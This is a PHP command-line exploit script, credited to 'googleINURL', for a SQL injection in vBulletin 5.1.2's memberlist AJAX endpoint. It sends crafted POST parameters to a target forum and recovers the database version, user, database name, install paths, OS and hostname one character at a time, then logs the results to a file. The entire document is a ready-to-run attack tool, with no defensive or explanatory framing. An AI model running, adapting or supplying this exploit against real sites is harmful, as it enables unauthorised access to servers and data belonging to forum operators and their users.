#!/usr/bin/php -q
<?php
/*

  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil


*/


error_reporting(0);
ini_set('display_errors', 0);

function __plus() {
    ob_flush();
    flush();
}

$GLOBALS['url'] = isset($argv[1]) ? $argv[1] : exit("\n\rDEFINA O HOST ALVO!\n\r");
$GLOBALS['arquivo'] = isset($argv[2]) ? $argv[2] : exit("\n\rDEFINA O ARQUIVO!\n\r");
$GLOBALS['expression'] = str_replace('/', '\\/', $GLOBALS['url']);
$GLOBALS['result'] = null;

function __httpPost($url, $params) {

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $params);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'X-Requested-With: XMLHttpRequest',
        'Referer: https://rstforums.com/v5/memberlist',
        'Accept-Language: en-US,en;q=0.5',
        'Cookie: bb_lastvisit=1400483408; bb_lastactivity=0;'
    ));
    __plus();
    $output = curl_exec($curl);
    (strpos($output, "Couldn't resolve host") == true) ? exit("\r\nSERVIDOR ERROR!\r\n") : NULL;
    ($output == FALSE) ? print htmlspecialchars(curl_error($ch)) : NULL;
    curl_close($ch);
    return $output;
}

function __get_dados($info, $limit) {
    $post1 = 'criteria[perpage]=10&criteria[startswith]="+OR+SUBSTR(user.username,1,1)=SUBSTR(' . $info . ',1  ,1)--+"+' .
            '&criteria[sortfield]=username&criteria[sortorder]=asc&securitytoken=guest';
    $result = __httpPost($GLOBALS['url'] . '/ajax/render/memberlist_items', $post1);
    $letter = 1;
    $rs = null;
    __plus();
    while (strpos($result, 'No Users Matched Your Query') == false && $letter < $limit) {
        $exploded = explode('<span class=\"h-left\">\r\n\t\t\t\t\t\t\t\t\t<a href=\"' . $GLOBALS['expression'] . '\/member\/', $result);
        $username = __get_string_between($exploded[1], '">', '<\/a>');
        print $username[0];
        $rs.=$username[0];
        __plus();
        $letter++;
        $result = __httpPost($GLOBALS['url'] . '/ajax/render/memberlist_items', 'criteria[perpage]=10&criteria[startswith]="+OR+SUBSTR(user.username,1,1)=SUBSTR(' . $info . ',' . $letter . ',1)--+"+' .
                '&criteria[sortfield]=username&criteria[sortorder]=asc&securitytoken=guest');
    }
    $GLOBALS['result'].= !empty($rs) ? "{$info}=>{$rs} :: ":NULL;
    __plus();
    print ($letter == $limit) ? "NULL" : NULL;
}

function __get_string_between($string, $start, $end) {
    $string = " " . $string;
    $ini = strpos($string, $start);
    if ($ini == 0)
        return "";
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

print "\r\nRomanian Security Team - vBulltin 5.1.2 SQL Injection /Etitado INURL - BRASIL\r";
print "\r\n--------------------------------------------------------------------------------------\r\n\r\n";
print "0x[+] ALVO=>{ " . $GLOBALS['url'];
print "\r\n0x[+] Version=>{ ";
__plus();
__get_dados("@@GLOBAL.VERSION", 4);
__plus();
print "\r\n0x[+] User=>{ ";
__plus();
__get_dados("user()", 20);
__plus();
print "\r\n0x[+] Databse=>{ ";
__plus();
__get_dados("database()", 50);
__plus();
print "\r\n0x[+] DIR BASE INSTALL=>{ ";
__get_dados("@@GLOBAL.basedir", 50);
__plus();
print "\r\n0x[+] DIR DATA INSTALL=>{ ";
__plus();
__get_dados("@@GLOBAL.datadir", 50);
__plus();
print "\r\n0x[+] SERVER INFO VERSÃO OS=>{ ";
__plus();
__get_dados("@@GLOBAL.version_compile_os", 50);
__plus();
print "\r\n0x[+] SERVER INFO VERSÃO COMPILE OS=>{ ";
__plus();
__get_dados("@@GLOBAL.version_compile_machine", 30);
__plus();
print "\r\n0x[+] SERVER INFO HOSTNAME=>{ ";
__plus();
__get_dados("@@GLOBAL.hostname", 30);
__plus();
print "\r\n\r\n--------------------------------------------------------------------------------------\r\n";
print "OUTPUT=> ".$GLOBALS['result'];
file_put_contents($arquivo, "{{$GLOBALS['url']} =>{ {$GLOBALS['result']}\r\n", FILE_APPEND);
